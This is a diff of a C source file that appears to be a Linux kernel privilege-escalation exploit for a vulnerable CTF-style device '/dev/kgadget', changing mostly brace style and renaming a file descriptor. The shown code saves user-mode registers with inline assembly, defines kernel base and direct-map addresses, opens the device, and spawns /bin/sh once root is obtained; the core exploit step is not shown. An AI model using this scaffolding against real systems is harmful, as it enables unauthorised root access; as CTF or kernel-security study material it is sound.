@@ -27,8 +27,7 @@
 
 size_t user_cs, user_ss, user_rflags, user_sp;
 
-void save_status(void)
-{
+void save_status(void) {
     __asm__("mov user_cs, cs;"
             "mov user_ss, ss;"
             "mov user_sp, rsp;"
@@ -38,23 +37,20 @@ void save_status(void)
     printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
 }
 
-void info_log(char* str){
+void info_log(char* str) {
   printf("\033[0m\033[1;32m[+]%s\033[0m\n",str);
 }
 
-void error_log(char* str){
+void error_log(char* str) {
   printf("\033[0m\033[1;31m%s\033[0m\n",str);
   exit(1);
 }
 
-void get_shell()
-{
-    if(!getuid())
-    {
+void get_shell() {
+    if(!getuid()) {
         system("/bin/sh");
     }
-    else
-    {
+    else {
         error_log("[*]get root shell error!");
     }
     exit(0);
@@ -66,16 +62,15 @@ size_t init_cred = 0;
 size_t raw_vmlinux_base = 0xffffffff81000000;
 size_t kernel_offset = 0;
 size_t direct_map = 0xffff888000000000; //  stop at ffffc88000000000
+int dev_fd = -1;
 
-
-int main()
-{
+int main() {
     save_status();
 
     printf(BULE_TEXT "[*] Opening dev...\n" RESET_COLOR);
 
-    fd = open("/dev/kgadget", O_RDWR);
-    if(fd < 0) {
+    dev_fd = open("/dev/kgadget", O_RDWR);
+    if(dev_fd < 0) {
         printf(RED_TEXT "[x] Failed to open dev!\n" RESET_COLOR);
         exit(1);
     }
